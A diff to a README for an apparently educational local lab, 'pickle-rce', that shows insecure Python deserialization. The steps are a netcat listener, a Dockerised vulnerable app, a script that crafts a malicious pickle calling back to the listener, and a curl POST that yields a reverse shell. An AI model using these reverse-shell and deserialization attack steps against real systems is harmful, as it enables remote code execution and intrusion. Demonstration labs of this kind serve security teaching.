@@ -15,17 +15,17 @@ model weights).
 ## Run it
 
 ```bash
-# Terminal 1 (host): listener
-nc -lvnp 4444
+# Terminal 1 (host): listener — macOS BSD `nc` has NO -lvnp; use ncat (brew install nmap)
+ncat -lvk 4444          # or BSD: nc -l 4444
 
-# Terminal 2 (host): start the vulnerable app
+# Terminal 2 (host): start the vulnerable app  (host 5000 is AirPlay's, so it's on 5001)
 cd shell-demos/pickle-rce
 docker compose up --build -d
 
 # Terminal 2: craft the malicious pickle (points back at your listener)
 LISTENER_HOST=host.docker.internal LISTENER_PORT=4444 python3 make_payload.py
-# copy the base64 it prints, then:
-curl -s -X POST http://localhost:5000/load -d "data=PASTE_BASE64_HERE"
+# copy the base64 it prints, then (use --data-urlencode so +/= aren't mangled):
+curl -s -X POST http://localhost:5001/load --data-urlencode "data=PASTE_BASE64_HERE"
 ```
 
 A shell lands in Terminal 1. Run `id` to show code execution as the app.
